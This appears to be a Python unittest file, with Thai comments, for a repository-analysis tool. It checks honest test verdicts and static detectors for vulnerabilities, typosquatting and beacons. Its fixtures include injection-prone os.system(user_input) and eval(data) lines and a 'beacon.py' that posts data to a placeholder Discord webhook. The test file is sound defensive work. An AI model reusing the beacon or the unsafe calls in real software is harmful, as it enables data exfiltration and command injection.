"""
test_repo_intel.py — tests for the repository-analysis module.

The heart of these tests is the HONESTY GUARANTEE: the verdict must be a pure
function of real execution evidence, and can never report "tested" when nothing
ran, nor "passed" when a real run failed. No network, no real subprocess: the
verdict engine is exercised with constructed Evidence, and the static capability
analyzers run against a synthetic repo in a temp dir.
(python -m unittest test_repo_intel)
"""

import os
import tempfile
import shutil
import unittest

from repo_intel.model import Evidence, ProbeKind, Fingerprint
from repo_intel import verdict as V
from repo_intel.verdict import VerdictStatus
from repo_intel import report as R
from repo_intel.model import RepoIntelReport
from repo_intel.capabilities import AnalysisContext
from repo_intel.capabilities import vuln_scan, supply_chain, opsec
from repo_intel import fingerprint as FP


def ev(kind, **kw):
    return Evidence(kind=kind, **kw)


class VerdictHonestyTest(unittest.TestCase):
    def test_no_evidence_is_untested(self):
        v = V.decide([])
        self.assertEqual(v.status, VerdictStatus.UNTESTED.value)
        self.assertFalse(v.tested)

    def test_install_only_is_still_untested(self):
        # ติดตั้งสำเร็จแต่ไม่ได้รันโค้ด repo → ต้องเป็น UNTESTED (ไม่ใช่ usable)
        v = V.decide([ev(ProbeKind.INSTALL.value, ran=True, passed=True, returncode=0)])
        self.assertEqual(v.status, VerdictStatus.UNTESTED.value)
        self.assertFalse(v.tested)

    def test_test_passed_is_usable_and_tested(self):
        v = V.decide([ev(ProbeKind.TEST.value, ran=True, passed=True, returncode=0)])
        self.assertEqual(v.status, VerdictStatus.USABLE.value)
        self.assertTrue(v.tested)

    def test_test_failed_is_not_usable_never_passed(self):
        v = V.decide([ev(ProbeKind.TEST.value, ran=True, passed=False, returncode=1)])
        self.assertEqual(v.status, VerdictStatus.NOT_USABLE.value)
        self.assertTrue(v.tested)
        # ต้องไม่มีคำว่า "ผ่าน" ในเหตุผลของกรณีล้มเหลว
        self.assertFalse(any("ผ่าน" in r for r in v.reasons))

    def test_test_timeout_is_not_usable(self):
        v = V.decide([ev(ProbeKind.TEST.value, ran=True, passed=False, timed_out=True)])
        self.assertEqual(v.status, VerdictStatus.NOT_USABLE.value)

    def test_runner_disabled_is_untested_not_failed(self):
        # เทสไม่ได้รันเพราะปิดสวิตช์ → UNTESTED ไม่ใช่ NOT_USABLE
        v = V.decide([ev(ProbeKind.TEST.value, ran=False,
                         skipped_reason="TEST_EXECUTION_DISABLED")])
        self.assertEqual(v.status, VerdictStatus.UNTESTED.value)
        self.assertFalse(v.tested)

    def test_smoke_only_pass_is_partial(self):
        v = V.decide([ev(ProbeKind.SMOKE.value, ran=True, passed=True, returncode=0)])
        self.assertEqual(v.status, VerdictStatus.PARTIALLY_USABLE.value)
        self.assertTrue(v.tested)

    def test_smoke_fail_is_not_usable(self):
        v = V.decide([ev(ProbeKind.SMOKE.value, ran=True, passed=False, returncode=2)])
        self.assertEqual(v.status, VerdictStatus.NOT_USABLE.value)


class ReportHonestyTest(unittest.TestCase):
    def _report(self, evidence):
        rep = RepoIntelReport(repository_id=1, repo="acme/tool #1",
                              created_at="now", fingerprint=Fingerprint(primary_language="Python"))
        rep.evidence = evidence
        rep.verdict = V.decide(evidence)
        rep.ai_summary = "สรุปทดสอบ"
        return rep

    def test_untested_report_says_not_tested(self):
        rep = self._report([ev(ProbeKind.TEST.value, ran=False, skipped_reason="NO_SUPPORTED_TEST_RUNNER")])
        text = R.render(rep)
        self.assertIn("ยังไม่ได้", text)
        self.assertNotIn("เทสจริงแล้วผ่าน", text)

    def test_failed_report_shows_failure_not_pass(self):
        rep = self._report([ev(ProbeKind.TEST.value, ran=True, passed=False,
                               returncode=1, command=["python", "-m", "pytest"])])
        text = R.render(rep)
        self.assertIn("ล้มเหลว", text)
        self.assertIn("🔴", text)

    def test_word_cap(self):
        rep = self._report([ev(ProbeKind.TEST.value, ran=True, passed=True, returncode=0)])
        rep.ai_summary = "คำ " * 5000
        text = R.render(rep)
        self.assertLessEqual(len(text.split()), 2010)


class CapabilityStaticTest(unittest.TestCase):
    def setUp(self):
        self.ws = tempfile.mkdtemp(prefix="repo_intel_test_")

    def tearDown(self):
        shutil.rmtree(self.ws, ignore_errors=True)

    def _write(self, rel, content):
        path = os.path.join(self.ws, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)

    def _ctx(self):
        return AnalysisContext(repository_id=1, workspace_path=self.ws,
                               fingerprint=Fingerprint())

    def test_vuln_scan_flags_dangerous(self):
        self._write("app.py", "import os\nos.system(user_input)\neval(data)\n")
        res = vuln_scan.run(self._ctx())
        titles = " ".join(f.title for f in res.findings)
        self.assertIn("os.system", titles)
        self.assertTrue(any(f.severity == "high" for f in res.findings))
        # PoC scaffold ต้องเป็นโครง unittest ไม่ใช่ exploit
        self.assertIn("unittest", res.data["poc_scaffold"])

    def test_supply_chain_unpinned_and_typosquat(self):
        self._write("requirements.txt", "requsts\nflask\nnumpy==1.26.0\n")
        res = supply_chain.run(self._ctx())
        titles = " ".join(f.title for f in res.findings)
        self.assertIn("typosquat", titles.lower())     # requsts ~ requests
        self.assertIn("ไม่ pin", titles)               # flask ไม่ระบุเวอร์ชัน

    def test_opsec_flags_webhook(self):
        self._write("beacon.py",
                    "import requests\nrequests.post('https://discord.com/api/webhooks/1/x', data=d)\n")
        res = opsec.run(self._ctx())
        self.assertTrue(any("webhook" in f.title for f in res.findings))

    def test_fingerprint_detects_python(self):
        self._write("main.py", "if __name__ == '__main__':\n    pass\n")
        self._write("requirements.txt", "requests==2.0\n")
        fp = FP.build(self.ws)
        self.assertEqual(fp.primary_language, "Python")
        self.assertIn("pip", fp.package_managers)
        self.assertIn("main.py", fp.entrypoints)


if __name__ == "__main__":
    unittest.main()
